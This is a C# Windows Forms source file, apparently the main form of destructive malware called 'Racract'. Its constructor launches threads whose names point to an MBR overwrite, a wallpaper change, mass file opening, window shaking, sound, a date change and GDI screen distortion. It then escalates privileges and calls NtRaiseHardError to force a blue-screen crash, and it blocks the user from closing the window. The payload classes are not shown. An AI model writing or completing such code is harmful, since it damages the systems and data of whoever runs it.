using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Racract
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            new Thread(WALL.cha).Start();
            new Thread(MBR.StartMBR).Start();
            new Thread(pay.openfiles).Start();
            Thread.Sleep(3000);
            new Thread(CODE2.MoveAllWindowsFast).Start();
            new Thread(SOUND.play).Start();
            new Thread(DATE.Start).Start();
            new Thread(GDI.ROXT).Start();
            Thread.Sleep(10000);
            new Thread(GDI.TRODI).Start();
            Thread.Sleep(100000);
            new Thread(GDI.InvertColor).Start();
            Thread.Sleep(30000);
            BSOD.RaisePrivilege();
            BSOD.CauseNtHardError();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
